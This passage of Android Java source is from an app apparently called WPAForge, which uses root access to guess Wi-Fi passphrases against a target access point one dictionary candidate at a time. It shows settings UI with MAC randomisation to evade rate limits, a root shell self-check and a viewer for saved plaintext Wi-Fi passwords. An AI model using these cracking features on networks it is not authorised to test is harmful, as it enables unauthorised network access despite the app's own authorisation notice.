                } catch (Throwable t) {
                    err.append(t);
                }
                ui.post(() -> {
                    refreshKeepAlive();
                    Toast.makeText(this, err.length() == 0
                                    ? L.s("已写入系统白名单", "whitelists updated")
                                    : L.s("写入失败（需要 root）", "failed (root required)"),
                            Toast.LENGTH_SHORT).show();
                });
            }, "wpaforge-fix-alive").start();
        });
        aliveCard.addView(groupDivider(12));
        aliveCard.addView(fixAlive);
        pageSettings.addView(aliveCard);

        // ---------------- 诊断 ----------------
        pageSettings.addView(sectionLabel(L.s("诊断", "Diagnostics")));
        LinearLayout diagCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        TextView diagHint = new TextView(this);
        diagHint.setText(L.s(
                "连不上 / 判不出时，先用这里定位：\n"
                + "· 完整自检（长按上面那行「执行方式」）看环境\n"
                + "· 连接自测：真发一次连接命令，逐层报告判定过程\n"
                + "· 导出日志：把运行日志复制到 Download 目录，直接发出来",
                "When it fails, locate the cause here:\n"
                + "· Self-check (long-press the execution-mode line above)\n"
                + "· Connection test: really send one connect command and report layer by layer\n"
                + "· Export log: copy the run log to Download for sharing"));
        diagHint.setTextSize(AmberTheme.FS_BODY);
        diagHint.setTextColor(TEXT_DIM);
        diagHint.setLineSpacing(px(5), 1f);
        diagCard.addView(diagHint);

        Button connTest = rowAction(L.s("连接自测（发一次真实连接命令）",
                "Connection test (send one real connect)"));
        connTest.setOnClickListener(v -> showConnTestDialog());
        diagCard.addView(groupDivider(10));
        diagCard.addView(connTest);

        Button exportLog = rowAction(L.s("导出日志到 Download", "Export log to Download"));
        exportLog.setOnClickListener(v -> exportLog());
        diagCard.addView(groupDivider(4));
        diagCard.addView(exportLog);
        pageSettings.addView(diagCard);

        // ---------------- 应用锁 ----------------
        pageSettings.addView(sectionLabel(L.s("应用锁", "App lock")));
        LinearLayout lockCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        Button pinBtn = rowAction(L.s("PIN 锁", "PIN lock"));
        pinBtn.setOnClickListener(v -> {
            if (Prefs.pinEnabled(this)) {
                // 已设置 → 提供修改 / 清除
                new android.app.AlertDialog.Builder(this)
                        .setTitle(L.s("PIN 锁已开启", "PIN lock is on"))
                        .setItems(new String[]{
                                L.s("修改 PIN", "Change PIN"),
                                L.s("清除 PIN", "Remove PIN")}, (d, w) -> {
                            if (w == 0) showPinSetup();
                            else confirmClearPin();
                        })
                        .setNegativeButton(L.s("取消", "Cancel"), null)
                        .show();
            } else {
                showPinSetup();
            }
        });
        lockCard.addView(pinBtn);

        TextView pinHint = new TextView(this);
        pinHint.setText(L.s("设置后每次打开应用都要先输入 PIN 才能进入。",
                "Once set, the PIN must be entered each time the app is opened."));
        pinHint.setTextSize(AmberTheme.FS_BODY);
        pinHint.setTextColor(TEXT_DIM);
        pinHint.setLineSpacing(px(5), 1f);
        lockCard.addView(groupDivider(6));
        lockCard.addView(pinHint, topGap(8));
        pageSettings.addView(lockCard);

        // ---------------- 连接选项 ----------------
        pageSettings.addView(sectionLabel(L.s("连接选项", "Connection options")));
        LinearLayout connCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        connPinBtn = rowActionPlain("");
        connPinBtn.setOnClickListener(v -> {
            Prefs.setPinBssid(this, !Prefs.pinBssid(this));
            refreshConnOptions();
            Toast.makeText(this, connPinBtn.getText(), Toast.LENGTH_SHORT).show();
        });
        connCard.addView(arrowRow(connPinBtn));

        connRotBtn = rowActionPlain("");
        connRotBtn.setOnClickListener(v -> {
            Prefs.setMacRotate(this, !Prefs.macRotate(this));
            refreshConnOptions();
            Toast.makeText(this, connRotBtn.getText(), Toast.LENGTH_SHORT).show();
        });
        connCard.addView(groupDivider(2));
        connCard.addView(arrowRow(connRotBtn));

        TextView connHint = new TextView(this);
        connHint.setText(L.s(
                "· 锁定 AP：同名 SSID 有多个 AP 时，只跟你在破解页选中的那一个打交道（默认交给系统挑）\n"
                + "· 更换随机 MAC：每次尝试换一个新 MAC，缓解目标 AP 限流；目标若做了 MAC 白名单，开着会连不上",
                "· Pin AP: when several APs share one SSID, talk only to the one you picked\n"
                + "· Random MAC: a new MAC per attempt eases AP rate limiting; breaks MAC-allowlisted targets"));
        connHint.setTextSize(AmberTheme.FS_BODY);
        connHint.setTextColor(TEXT_DIM);
        connHint.setLineSpacing(px(5), 1f);
        connCard.addView(groupDivider(8));
        connCard.addView(connHint, topGap(8));
        pageSettings.addView(connCard);
        refreshConnOptions();

        // ---------------- 破解设置 ----------------
        pageSettings.addView(sectionLabel(L.s("破解设置", "Crack settings")));
        TextView speedInfo = new TextView(this);
        speedInfo.setText(L.s("破解速度由目标路由器决定，实测约 1 秒/条。",
                        "Speed depends on the target router. Measured: about 1 second per attempt.")
                + " "
                + L.s("手机一次只能连一个网络，无法并行，这是 Android 的限制。",
                        "A phone can associate with only one network at a time — no parallelism. That is an Android limit."));
        speedInfo.setTextSize(AmberTheme.FS_BODY);
        speedInfo.setTextColor(TEXT_DIM);
        speedInfo.setLineSpacing(px(5), 1f);
        speedInfo.setBackground(AmberTheme.rowBg(this, dp, AmberTheme.RADIUS_CARD));
        speedInfo.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        pageSettings.addView(speedInfo);

        // ---------------- 工具 ----------------
        pageSettings.addView(sectionLabel(L.s("工具", "Tools")));
        LinearLayout toolsCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        Button saved = rowAction(L.s("本机已存 WiFi 自查", "Inspect saved Wi-Fi"));
        saved.setOnClickListener(v -> showSavedWifi());
        toolsCard.addView(saved);

        Button hist = rowAction(L.s("破解记录", "Crack history"));
        hist.setOnClickListener(v -> showHistory());
        toolsCard.addView(groupDivider(2));
        toolsCard.addView(hist);

        Button exp = rowAction(L.s("导出记录", "Export records"));
        exp.setOnClickListener(v -> doExport());
        toolsCard.addView(groupDivider(2));
        toolsCard.addView(exp);

        // 迁移遗留的明文备份：**只在存在时**出现一行，删不删由用户定（P0-2）。
        // 不做自动清理：那是数据销毁，且会同时丢掉唯一的回滚依据。
        java.io.File[] plainBaks =
                io.github.wlmosv_png.wpaforge.audit.PlaintextMigration.backupsIn(getFilesDir());
        if (plainBaks.length > 0) {
            long bytes = 0;
            for (java.io.File f : plainBaks) bytes += f.length();
            plainBakBtn = rowAction(L.f("清理明文备份（%d 个 · %.1f KB）",
                    "Purge plaintext backups (%d files, %.1f KB)",
                    plainBaks.length, bytes / 1024.0));
            plainBakBtn.setOnClickListener(v -> confirmPurgePlaintextBackups());
            toolsCard.addView(groupDivider(2));
            toolsCard.addView(plainBakBtn);
        }
        pageSettings.addView(toolsCard);

        // ---------------- 使用边界 ----------------
        pageSettings.addView(sectionLabel(L.s("使用边界", "Scope of use")));
        pageSettings.addView(infoBlock(L.s("仅对自己有授权的网络使用", "Use only on networks you are authorised for"),
                L.s("破解会向目标 AP 发起真实的关联请求。对自有网络是自查，", "WPAForge issues real association requests. On your own network that is a self-audit;")
                + L.s("对未授权网络是违法行为，且路由器侧会留下失败记录。", "on an unauthorised network it is unlawful, and the AP will log the failures.")));

        pageSettings.addView(infoBlock(L.s("关于速度", "About speed"),
                L.s("逐条连接受目标响应速度限制，快的 AP 约 1 秒，慢的可能 5 秒以上。", "Each attempt waits on the target. A fast AP takes ~1s, a slow one 5s or more.")
                + L.s("字典越大耗时越久 —— 建议先用目标派生 + 智能排序，几百条往往比十万条有效。", "Bigger dictionaries take longer — target derivation plus smart ranking makes a few hundred entries beat a hundred thousand.")));

        // ---------------- 版本 ----------------
        pageSettings.addView(sectionLabel(L.s("版本", "Version")));
        LinearLayout verCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        TextView ver = new TextView(this);
        ver.setText(Ver.labeled(this));
        ver.setTextSize(AmberTheme.FS_BODY);
        ver.setTextColor(TEXT_DIM);
        verCard.addView(ver);

        Button toAuthor = rowAction(L.s("关于我 / 我的其它项目", "About me / my other projects"));
        toAuthor.setOnClickListener(v ->
                startActivity(new android.content.Intent(this, AboutActivity.class)));
        verCard.addView(groupDivider(10));
        verCard.addView(toAuthor);
        pageSettings.addView(verCard);
    }

    /** 组内分隔线（上方留白由调用方给）。 */
    private View groupDivider(int topGapDp) {
        LinearLayout wrap = new LinearLayout(this);
        wrap.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(topGapDp);
        wrap.setLayoutParams(lp);
        wrap.addView(AmberTheme.divider(this, dp));
        return wrap;
    }

    /** 一个带上方间距的行容器参数。 */
    /** 模块间距：section 之间统一 20dp（视觉规范）。 */
    private LinearLayout.LayoutParams sectionGap() {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(20);
        return lp;
    }

    /** 卡片内小组件间距 8dp（视觉规范）。 */
    private LinearLayout.LayoutParams widgetGap() {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(8);
        return lp;
    }

    /**
     * 完整运行记录对话框：日志从首页移出后的查看入口。
     *
     * <p>任务书七节：首页只留最近一条事件 + 入口；完整日志进独立详情页。
     * 这里用对话框承载（WPS 页是单 Activity 程序化 UI，不额外起 Activity），
     * 日志按时间/事件/内容三列展示，技术细节随行、可整体滚动。
     */
    private void showWpsRunningLogDialog() {
        StringBuilder sb = new StringBuilder();
        if (wpsLogMgr.isEmpty()) {
            sb.append(L.s("（还没有运行记录）", "(no log entries yet)"));
        } else {
            // 时间 + 事件：每行追加时间戳（wpsLog 没存时间，这里给最近一条的读取友好格式）
            String raw = wpsLogMgr.snapshot();
            String[] lines = raw.split("\n");
            for (int i = 0; i < lines.length; i++) {
                String l = lines[i].trim();
                if (l.isEmpty()) continue;
                sb.append(android.text.format.DateFormat.format("HH:mm:ss",
                                System.currentTimeMillis() - (lines.length - 1 - i) * 1000L))
                        .append("  ").append(l).append('\n');
            }
        }
        if (sb.length() > 12000) sb.setLength(12000);
        io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this, L.s("运行记录", "Run log"), sb.toString());
    }

    private LinearLayout.LayoutParams topGap(int dpValue) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(dpValue);
        return lp;
    }

    /**
     * 扁平设置行：整行可点、无自有底色、左标题 + 右 ›。
     *
     * <p>改版前这里清一色是「大胶囊按钮」：一整页十几个按钮浮在页面上，
     * 每个都像主操作，页面自然乱。行式结构把所有操作压成同一高度，
     * 层级只由分组标题和小节顺序表达。
     */
    private Button rowAction(String label) {
        return rowActionPlain(label + "   ›");
    }

    /** 同 {@link #rowAction}，但文字里不带箭头（文字会动态变化的那种行用，
     *  箭头由 {@link #arrowRow} 单独补一个，免得动态文字把箭头覆盖掉）。 */
    private Button rowActionPlain(String label) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_BODY + 1f);
        b.setTextColor(TEXT);
        b.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setStateListAnimator(null);
        b.setMinWidth(0);
        b.setMinimumWidth(0);
        b.setMinHeight(0);
        b.setMinimumHeight(0);
        b.setPadding(0, px(13), 0, px(13));
        b.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                AmberTheme.CARD, dp(AmberTheme.RADIUS_CHIP)));
        b.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        io.github.wlmosv_png.wpaforge.ui.UiKit.enableTapHaptic(b);
        return b;
    }

    /** 把操作按钮包成一行：按钮占满、右端一个 ›（用于文字会变化的行）。 */
    private LinearLayout arrowRow(Button b) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        b.setLayoutParams(new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        row.addView(b);
        TextView arrow = new TextView(this);
        arrow.setText("›");
        arrow.setTextSize(AmberTheme.FS_TITLE);
        arrow.setTextColor(AmberTheme.TEXT_FAINT);
        arrow.setPadding(px(6), 0, 0, 0);
        row.addView(arrow);
        return row;
    }

    /** 语言行的文字（点开选择器后由 refreshLanguageRow 刷新）。 */
    /**
     * 清理明文备份的确认框（P0-2）。
     *
     * <p>三件事必须说清楚，不能含糊：① 里面是什么（含**明文**口令的迁移前旧文件）；
     * ② 删了之后失去什么（唯一回滚依据；当前文件已是脱敏+密文，功能不受影响）；
     * ③ **不承诺彻底清除** —— 删除只是摘目录项，闪存层面是否残留不由应用决定。
     */
    private void confirmPurgePlaintextBackups() {
        io.github.wlmosv_png.wpaforge.ui.NetDialog d = new io.github.wlmosv_png.wpaforge.ui.NetDialog(
                this, L.s("清理明文备份", "Purge plaintext backups"),
                L.s("这两个文件是「明文口令 → 密文」迁移之前留下的整份拷贝，"
                                + "里面**含明文口令**（应用私有目录 0600，别的应用读不到）。\n\n"
                                + "保留它们的唯一理由是回滚：万一当初的迁移把文件写坏，还能拿它顶回去。"
                                + "当前的历史与队列已经是「脱敏标签 + Keystore 密文」，功能不受影响。\n\n"
                                + "删除后不再有回滚依据。注意：删除不等于在闪存层面被彻底抹除 —— "
                                + "这只是摘掉目录项，物理介质是否残留由主控决定，应用无法保证。",
                        "These two files are the pre-migration copies and contain **plaintext** "
                                + "passphrases (app-private dir, mode 0600).\n\n"
                                + "They are kept only as a rollback path in case that migration "
                                + "corrupted a file; the live files are tag + Keystore-sealed now.\n\n"
                                + "Deleting removes the rollback path. Note: deletion does not "
                                + "guarantee forensic erasure on flash - that is up to the controller."));
        d.setDanger(L.s("删除这两个文件", "Delete both files"), dd -> {
            int n = io.github.wlmosv_png.wpaforge.audit.PlaintextMigration.purgeIn(getFilesDir());
            if (plainBakBtn != null) {
                plainBakBtn.setText(n > 0
                        ? L.s("明文备份已清理", "Plaintext backups purged")
                        : L.s("清理失败（文件仍在）", "purge failed (files remain)"));
                plainBakBtn.setEnabled(false);
            }
            Toast.makeText(this, n > 0
                    ? L.s("已删除 " + n + " 个明文备份", "Deleted " + n + " plaintext backup(s)")
                    : L.s("没有删除成功", "Nothing deleted"), Toast.LENGTH_LONG).show();
        });
        d.setNegative(L.s("保留", "Keep"), null);
        d.show();
    }

    private void refreshLanguageRow() {
        if (languageBtn == null) return;
        languageBtn.setText(L.f("语言 · 当前 %s", "Language · currently %s",
                L.modeLabel(this)) + "   ›");
    }

    /** 圆角胶囊按钮 */
    private Button makeButton(String label, int color) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_STATE);
        b.setTextColor(isLight(color) ? AmberTheme.ON_ACCENT : Color.WHITE);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setPadding(px(20), px(14), px(20), px(14));
        b.setMinHeight(0);
        b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setBackground(roundBg(color, AmberTheme.RADIUS_BTN));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = px(5);
        lp.bottomMargin = px(11);
        b.setLayoutParams(lp);
        io.github.wlmosv_png.wpaforge.ui.UiKit.enableTapHaptic(b);
        return b;
    }

    /**
     * 主操作按钮：实心琥珀，深色字。
     * 一屏里只该出现一个。
     */
    private Button btnPrimary(String label) {
        Button b = makeButton(label, ACCENT);
        b.setTextColor(ON_ACCENT);
        return b;
    }

    /**
     * 次操作按钮：暗底 + 淡描边，浅色字。
     * 设置页那一串都用这个，视觉上让位给主操作。
     */
    private Button btnSecondary(String label) {
        Button b = makeButton(label, BTN_2ND_BG);
        b.setTextColor(TEXT);
        b.setBackground(roundBgStroked(BTN_2ND_BG, BTN_2ND_EDGE, AmberTheme.RADIUS_BTN, 0.8f));
        return b;
    }

    /** 危险按钮：暗底 + 红字。只给「会丢东西」的动作。 */
    private Button btnDanger(String label) {
        Button b = btnSecondary(label);
        b.setTextColor(DANGER);
        b.setBackground(roundBgStroked(AmberTheme.DANGER_SOFT_BG,
                AmberTheme.DANGER_EDGE, AmberTheme.RADIUS_BTN, 0.8f));
        return b;
    }

    private boolean isLight(int color) {
        int r = (color >> 16) & 0xFF, g = (color >> 8) & 0xFF, b = color & 0xFF;
        return (r * 299 + g * 587 + b * 114) / 1000 > 150;
    }

    /** 信息块 */
    private View infoBlock(String title, String body) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        box.setPadding(px(18), px(16), px(18), px(16));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(8);
        box.setLayoutParams(lp);

        TextView t = new TextView(this);
        t.setText(title);
        t.setTextSize(AmberTheme.FS_MONO);
        t.setTextColor(ACCENT);
        box.addView(t);

        TextView b = new TextView(this);
        b.setText(body);
        b.setTextSize(AmberTheme.FS_BODY);
        b.setTextColor(TEXT_DIM);
        b.setLineSpacing(px(4), 1f);
        b.setPadding(0, px(6), 0, 0);
        box.addView(b);
        return box;
    }

    /** 次级按钮（中等宽度，胶囊） */
    private Button secondaryButton(String label, int color) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(AmberTheme.FS_ACTION);
        b.setTextColor(color);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(14), px(13), px(14), px(13));
        return b;
    }

    /** 两列等分布局参数 */
    private LinearLayout.LayoutParams twoColParams(int rightMargin) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(rightMargin);
        lp.bottomMargin = px(4);
        return lp;
    }

    /** 三列等分布局（比两列窄，用于三个模式按钮并排） */
    private LinearLayout.LayoutParams thirdColParams(int rightMargin) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(rightMargin);
        lp.bottomMargin = px(4);
        return lp;
    }

    /** 填充设置页的模式说明卡片。切模式后会重新调用。 */
    private void fillModeInfo() {
        if (modeInfo == null) return;

            int m = Prefs.mode(this);
            StringBuilder sb = new StringBuilder();
            sb.append(L.s("当前: Root 模式（推荐）", "Current: root mode (recommended)")).append("\n\n");
            sb.append(L.s(
                    "通过 su 调用系统的 cmd wifi 命令，完全自动、不弹窗。\n"
                    + "实测约 1 秒/条，且进度和暂停都可控。\n"
                    + "需要设备已 root 并给本应用授权。\n"
                    + "（Shizuku 与免 Root 通道已在 1.9.24 移除：前者每次关联都要借 binder、"
                    + "后者每条候选都要弹一次系统确认框，都撑不起逐条字典遍历。）",
                    "Invokes the system's cmd wifi via su — fully automatic, no dialogs.\n"
                    + "Measured about 1 second per attempt, with precise progress and pause.\n"
                    + "Requires a rooted device with root granted to this app.\n"
                    + "(The Shizuku and root-free channels were removed in 1.9.24: they cannot "
                    + "sustain per-candidate dictionary traversal.)"));
            sb.append("\n\n").append(L.f("当前实测速度: %s 条/秒",
                    "Measured: %s per second", Prefs.avgRateLabel(this)));
            if (!Prefs.hasRateSample(this)) {
                sb.append(L.s("（还没有样本，这是模式默认值）",
                        " (no samples yet — mode default)"));
            }
            modeInfo.setText(sb.toString());
            modeInfo.setTextColor(ACCENT);

    }

    /**
     * 模式可用性检测。
     *
     * 现在改成调用 **引擎的通道自检** —— 它会把整条判定链实际跑一遍
     * 并逐条给出证据（命令能不能执行、返回什么、判定信号读不读得到）。
     * 之前在设置页只显示一句结论，用户没法判断到底是哪一环坏了。
     */
    private void refreshModeReady() {
        if (modeReadyLabel == null) return;
        final int m = Prefs.mode(this);
        modeReadyLabel.setTextColor(TEXT_DIM);
        modeReadyLabel.setText(modeName(m) + L.s("：正在检测…", ": checking…"));
        // 点一下重新检测。
        modeReadyLabel.setOnClickListener(v -> refreshModeReady());
        // 长按看完整自检证据
        modeReadyLabel.setOnLongClickListener(v -> {
            showChannelProbeDetail();
            return true;
        });

        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.RootProber.CheckResult r =
                    io.github.wlmosv_png.wpaforge.audit.RootProber.check(getApplicationContext());
            boolean ok = r.ok;
            String text = ok ? L.s("\u2713 \u5df2\u5c31\u7eea", "\u2713 ready")
                             : L.s("\u2717 ", "\u2717 ") + r.title;
            final String ft = modeName(m) + L.s("\uff1a", ": ") + text
                    + L.s("\uff08\u70b9\u6b64\u91cd\u6d4b\uff09", " (tap to re-check)");
            final boolean fok = ok;
            ui.post(() -> {
                if (modeReadyLabel == null) return;
                modeReadyLabel.setText(ft);
                modeReadyLabel.setTextColor(fok ? OK_GREEN : DANGER);
            });
        }, "wpaforge-modecheck").start();
    }

    /**
     * 弹出通道自检的完整证据。
     *
     * 用户点长按状态行就能看到：命令跑了多久、返回了什么、
     * 两个判定信号当前能不能读到值 —— 不用再来回问我。
     */
    private void showChannelProbeDetail() {
        final int m = Prefs.mode(this);
        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.CrackEngine eng =
                    new io.github.wlmosv_png.wpaforge.audit.CrackEngine(this, m);
            eng.setShellChannel(new io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel() {
                @Override
                public String exec(String cmd, long timeoutMs) {
                    return io.github.wlmosv_png.wpaforge.audit.RootProber
                            .exec(null, new String[]{"su", "-c", cmd}, timeoutMs);
                }
                @Override public String name() { return "Root"; }
            });
            io.github.wlmosv_png.wpaforge.audit.CrackEngine.ChannelProbe p = eng.probeChannel();
            StringBuilder sb = new StringBuilder();
            for (String line : p.steps) sb.append(line).append('\n');
            // 附上完整环境诊断（设备/权限/各判据层可读性）
            try {
                io.github.wlmosv_png.wpaforge.audit.EnvDiagnostics.Report r =
                        io.github.wlmosv_png.wpaforge.audit.EnvDiagnostics.run(
                                MainActivity.this, m, eng.getShellChannelForDiag());
                sb.append('\n').append(r.text);
            } catch (Throwable t) {
                sb.append("\n环境诊断失败: ").append(t.getClass().getSimpleName());
            }
            final String body = sb.toString().trim();
            final String title = (p.ok ? "✓ " : "✗ ") + p.summary;
            ui.post(() -> {
                NetDialog d = new NetDialog(MainActivity.this,
                        L.s("通道自检", "Channel self-check"), body);
                d.setPositive(L.s("知道了", "Got it"), null);
                d.show();
            });
        }, "wpaforge-probe").start();
    }

    /** 模式名（不带“模式”后缀，用于状态行前缀） */
    private String modeName(int m) {
        return "Root";
    }

    /** 圆角背景 */
    /**
     * 圆角背景 —— 统一走 UiKit。
     *
     * 之前这里返回静态 GradientDrawable，配合 setStateListAnimator(null)，
     * 结果是「按下去什么都没变」。现在可点元素自带水波纹，禁用态压暗。
     */
    private android.graphics.drawable.Drawable roundBg(int color, float radiusDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(color, dp(radiusDp));
    }

    /**
     * 带描边的圆角底。
     *
     * 为什么需要：纯暗底按钮在近黑背景上边界糊掉，
     * 加一条 1dp 的淡白边就能把「这是一块可点的东西」说清楚，
     * 又不像实心主色那样抢注意力。
     */
    private android.graphics.drawable.Drawable roundBgStroked(
            int fill, int edge, float radiusDp, float strokeDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit
                .rippleStroked(fill, edge, dp(radiusDp), px(strokeDp));
    }

    private void openUrl(String url) {
        try {
            startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW,
                    android.net.Uri.parse(url)));
        } catch (Exception e) {
            Toast.makeText(this, url, Toast.LENGTH_LONG).show();
        }
    }

    // ---------------- 本机已存 WiFi 自查 ----------------

    /** 语言选择 */
    private void showLanguagePicker() {
        NetDialog d = new NetDialog(this, L.s("语言", "Language"), null);
        d.addItem(L.s("跟随系统", "Follow system") + (L.getMode() == L.AUTO ? "   ✓" : ""),
                dd -> applyLanguage(L.AUTO));
        d.addItem(L.s("中文", "Chinese") + (L.getMode() == L.ZH ? "   ✓" : ""),
                dd -> applyLanguage(L.ZH));
        d.addItem(L.s("English", "English") + (L.getMode() == L.EN ? "   ✓" : ""),
                dd -> applyLanguage(L.EN));
        d.setNegative(L.s("取消", "Cancel"), null);
        d.show();
    }

    /** 切换语言后重建界面 */
    private void applyLanguage(int mode) {
        L.setMode(this, mode);
        // 重建 Activity 让所有文案生效
        android.content.Intent i = getIntent();
        finish();
        startActivity(i);
        overridePendingTransition(0, 0);
    }

    // ─────────────────────────── 本机已存 WiFi：列表 UI（2026-10-24 重做）───────────

    /** 最近一次读到的已存网络（过滤时重绘用；不改变读取与评分）。 */
    private java.util.List<SavedWifiReader.Saved> savedWifiList = new java.util.ArrayList<>();
    /** 列表容器（过滤只重建它的子视图）。 */
    private LinearLayout savedWifiListBox;
    /** 过滤模式：0 全部 / 1 弱口令(≥50) / 2 开放网络。 */
    private int savedWifiFilter = 0;
    private final TextView[] savedWifiChips = new TextView[3];
    private final int[] savedWifiChipCounts = new int[3];

    /**
     * 本机已存 WiFi —— 列表重做（用户反馈：口令一长就看不到）。
     *
     * <h3>改前的问题</h3>
     * 条目是 {@code NetDialog.addItem(...)} 的一行文本，而 addItem 会
     * {@code setSingleLine(true)} + {@code ellipsize(MIDDLE)} —— 于是
     * {@code fast_2345abcdef} 显示成 {@code fast_...2345}，**口令根本看不清**；
     * 39 个网络堆起来也没有任何层级。
     *
     * <h3>现在</h3>
     * 每行一张卡：SSID（可截断）+ 强度胶囊（分数档位色）；口令**独占一行、等宽、
     * 最多折三行、绝不省略**；第三行小字给长度与安全类型；点整行复制口令。
     * 顶部三枚过滤胶囊（全部 / 弱口令 ≥50 / 开放网络）只是本地过滤，读盘与评分不变。
     */
    private void showSavedWifiList(java.util.List<SavedWifiReader.Saved> list) {
        savedWifiList = list == null ? new java.util.ArrayList<>() : list;
        savedWifiFilter = 0;
        savedWifiChipCounts[0] = savedWifiList.size();
        savedWifiChipCounts[1] = 0;
        savedWifiChipCounts[2] = 0;
        for (SavedWifiReader.Saved sw : savedWifiList) {
            if (!sw.hasPassword()) {
                savedWifiChipCounts[2]++;
            } else if (SavedWifiReader.weaknessScore(sw.password) >= 50) {
                savedWifiChipCounts[1]++;
            }
        }

        NetDialog d = new NetDialog(this,
                L.f("本机已存 WiFi（%d 个）", "Saved Wi-Fi (%d)", savedWifiList.size()),
                L.s("口令由系统明文保存，这里只做本地展示、不上传。点任意一行可复制口令。",
                        "Passphrases are stored in plaintext by the system. "
                                + "Shown locally only, never uploaded. Tap a row to copy."));

        LinearLayout chips = new LinearLayout(this);
        chips.setOrientation(LinearLayout.HORIZONTAL);
        String[] names = {L.s("全部", "All"), L.s("弱口令 ≥50", "Weak ≥50"), L.s("开放网络", "Open")};
        for (int i = 0; i < 3; i++) {
            final int mode = i;
            TextView c = new TextView(this);
            c.setText(names[i] + " " + savedWifiChipCounts[i]);
            c.setTextSize(AmberTheme.FS_LABEL);
            c.setPadding(px(10), px(5), px(10), px(5));
            c.setOnClickListener(v -> {
                savedWifiFilter = mode;
                renderSavedWifiRows();
            });
            LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            clp.rightMargin = px(6);
            chips.addView(c, clp);
            savedWifiChips[i] = c;
        }
        d.addView(chips);

        savedWifiListBox = new LinearLayout(this);
        savedWifiListBox.setOrientation(LinearLayout.VERTICAL);
        d.addView(savedWifiListBox);
        renderSavedWifiRows();

        d.addHint(L.f("共 %d 个网络：弱口令 %d、开放 %d。分数越高越容易被猜中；口令只在本机显示。",
                "%d networks: %d weak, %d open. Higher score = easier to guess. Shown locally only.",
                savedWifiChipCounts[0], savedWifiChipCounts[1], savedWifiChipCounts[2]));
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();
    }

    /** 过滤胶囊外观（选中＝实心琥珀）。 */
    private void refreshSavedWifiChips() {
        for (int i = 0; i < savedWifiChips.length; i++) {
            TextView c = savedWifiChips[i];
            if (c == null) continue;
            boolean on = (i == savedWifiFilter);
            c.setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_DIM);
            c.setBackground(on
                    ? io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(ACCENT, dp(AmberTheme.RADIUS_CHIP))
                    : io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                            AmberTheme.CARD_2, BTN_2ND_EDGE, dp(AmberTheme.RADIUS_CHIP), dp(0.8f)));
        }
    }

    /** 按当前过滤重建行（**只影响显示**，不动读取与评分）。 */
    private void renderSavedWifiRows() {
        if (savedWifiListBox == null) return;
        savedWifiListBox.removeAllViews();
        int shown = 0;
